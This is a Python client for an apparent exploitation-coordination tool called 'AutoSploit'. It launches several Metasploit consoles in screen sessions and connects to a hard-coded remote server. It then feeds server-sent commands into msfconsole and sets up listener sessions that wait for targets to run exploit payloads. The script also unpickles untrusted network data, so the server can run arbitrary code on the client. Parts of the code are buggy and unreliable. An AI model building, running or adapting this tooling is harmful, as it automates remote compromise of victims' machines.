import socket
import subprocess
from Data.data import Data
import pickle
import asyncio
import threading
import time
import random
import uuid

class session_info:
    def __init__(self, payload, screen_name):
        self.payload = payload
        self.screen_name = screen_name
    def __repr__(self):
        return f"Payload: {self.payload}, Screen Name: {self.screen_name}"
    def __str__(self):
        return f"Payload: {self.payload}, Screen Name: {self.screen_name}"

def monitor_sessions(sessions):
    while True:
        time.sleep(5)
        ports = list(sessions.keys())
        for port in ports:
            if subprocess.run(["fuser", f"{port}/tcp"], capture_output=True, text=True).returncode:
                del sessions[port]

async def run_msfconsole(screen_name):
    await asyncio.create_subprocess_exec("screen", "-S", screen_name, "-X", "stuff", "msfconsole\n")
    await asyncio.create_subprocess_exec("screen", "-S", screen_name, "-X", "stuff", "echo READY\n")

def screen_ready(screen_name):
    result = subprocess.run(["screen", "-S", screen_name, "-X", "hardcopy", "/tmp/autosploit.log"], check=True)
    if result.returncode == 0:
        with open("/tmp/autosploit.log", "r") as f:
            output = f.read()
            return "> echo READY" in output
    return False

def monitor_screen(screen):
    while True:
        time.sleep(5)
        if len(screen) < 3:
            screen_name = "metasploit_"+str(uuid.uuid4().hex)
            subprocess.run(["screen", "-dmS", screen_name], check=True)
            asyncio.run(run_msfconsole(screen_name))
            screen.append(screen_name)

def connect_to_server():
    host = 'easysploit.rocknroll17.com'
    port = 12345

    screen = []
    sessions = {}
    try:
        for i in range(3):
            screen_name = "metasploit_"+str(uuid.uuid4().hex)
            subprocess.run(["screen", "-dmS", screen_name], check=True)
            asyncio.run(run_msfconsole(screen_name))
            screen.append(screen_name)
        subprocess.run(["clear"])
        print("Initializing the msfconsole sessions.")
        while not all([screen_ready(screen_name) for screen_name in screen]):
            time.sleep(0.5)
        subprocess.run(["clear"])
        print("All msfconsole sessions are ready.")
        time.sleep(1)
        subprocess.run(["clear"])
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        sessions_thread = threading.Thread(target=monitor_sessions, args=(sessions,))
        sessions_thread.daemon = True
        sessions_thread.start()

        screen_thread = threading.Thread(target=monitor_screen, args=(screen,))
        screen_thread.daemon = True
        screen_thread.start()

    
        client_socket.connect((host, port))
        print("""
 █████╗ ██╗   ██╗████████╗ ██████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████║██║   ██║   ██║   ██║   ██║███████╗██████╔╝██║     ██║   ██║██║   ██║   
██╔══██║██║   ██║   ██║   ██║   ██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
██║  ██║╚██████╔╝   ██║   ╚██████╔╝███████║██║     ███████╗╚██████╔╝██║   ██║   
╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   

You are now connected to the server.
If any target requests a payload with your IP, then server will make you a msfconsole listener session.
Just stay connected to the server and wait for the target execute the exploit code.
              
Waiting for the signals from the server...
""")
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            command = pickle.loads(data)
            if command.type == "Command":
                command_data = command.content.strip()
                subprocess.run(["screen", "-S", screen_name, "-X", "stuff", f"{command_data}\n"], check=True)
                if command_data == "exploit":
                    while subprocess.run(["fuser", f"{listen_port}/tcp"], capture_output=True, text=True).returncode:
                        pass
                client_socket.sendall(bytes(Data("Response", "OK")))
            elif command.type == "Exit":
                print("Exit command received from the server.")
                client_socket.sendall(bytes(Data("Response", "OK")))
                client_socket.close()
                break
            elif command.type == "EXPLOIT":
                payload = command.content.split(":")[1].strip()
                subprocess.run(["gnome-terminal", "--", "screen", "-r", f"{screen_name}"], check=True)
                # subprocess.Popen(["screen", "-r", f"{screen_name}"])
                sessions[listen_port] = session_info(payload, screen_name)
                client_socket.sendall(bytes(Data("Response", "OK")))
            elif command.type == "Info":
                print(f"Info: {command.content}")
                client_socket.sendall(bytes(Data("Response", "OK")))
            elif command.type == "Exploit Info":
                info_list = command.content.split("\\")
                exploit_info = {}
                for info in info_list:
                    exploit_info[info.split(":")[0].strip()] = info.split(":")[1].strip()
                
                # if fuser를 통해서 사용중인 port 라면 포트 중에 같은 payload를 쓰는 세션이 있는지 확인
                if subprocess.run(["fuser", f"{int(exploit_info['Port'])}/tcp"], capture_output=True, text=True).returncode == 0 and sessions.get(int(exploit_info["Port"])) is None:
                    # 이미 사용중인 port라면 다른 port를 사용하도록 요청
                    # 같은 payload를 사용하는 세션이 있는지 확인
                    is_exit = False
                    for port in sessions.keys():
                        if sessions[port].payload == exploit_info["Payload"]:
                            exploit_info["Port"] = sessions[port]
                            is_exit = True
                            break
                    if is_exit:
                        is_exit = False
                        client_socket.sendall(bytes(Data("Response", f"Port: {port}\\")))# This one should be fixed for multiple messages
                        continue
                    
                    print(f"Port {int(exploit_info['Port'])} is already in use. Requesting a new port.")
                    new_port = get_available_port()
                    print(f"Port remapped to {new_port}")
                    listen_port = new_port
                    exploit_info["Port"] = new_port
                    client_socket.sendall(bytes(Data("Response", f"Port: {listen_port}")))

                elif sessions.get(int(exploit_info["Port"])) is None:
                    listen_port = int(exploit_info["Port"])
                    screen_name = screen.pop(0)
                    client_socket.sendall(bytes(Data("Response", "OK")))
                elif sessions.get(int(exploit_info["Port"])) and sessions.get(int(exploit_info["Port"])).payload == exploit_info["Payload"]:
                    # Session already exists no need to create a new one
                    print("Session already exists. Use the existing session.")
                    client_socket.sendall(bytes(Data("Response", "Exist")))
                elif sessions.get(int(exploit_info["Port"])) and sessions.get(int(exploit_info["Port"])).payload != exploit_info["Payload"]:
                    # Session exists but the payload is different
                    print("Port already in use with a different payload. Remapping the port.")
                    new_port = get_available_port()
                    print(f"Port remapped to {new_port}")
                    listen_port = new_port
                    client_socket.sendall(bytes(Data("Response", f"Port: {listen_port}")))
                del exploit_info
            else:
                pass
                    
    except KeyboardInterrupt:
        print("Program terminated by the user.")
    except ConnectionRefusedError:
        print("Connection refused. Please check the server.")
    except Exception as e:
        print(f"Error occurred: {e}")
    finally:
        try:
            client_socket.close()
        except:
            pass
        for screen_name in screen:
            try:
                subprocess.Popen(["screen", "-S", screen_name, "-X", "quit"])
            except:
                pass
        if sessions is not None:
            for screen_name in [session.screen_name for session in sessions.values()]:
                try:
                    subprocess.Popen(["screen", "-S", screen_name, "-X", "quit"])
                except:
                    pass

def get_available_port():
    while True:
        random_port = random.randint(1024, 65535)
        if subprocess.run(["fuser", f"{random_port}/tcp"], capture_output=True, text=True).returncode != 0:
            return random_port

if __name__ == '__main__':
    connect_to_server()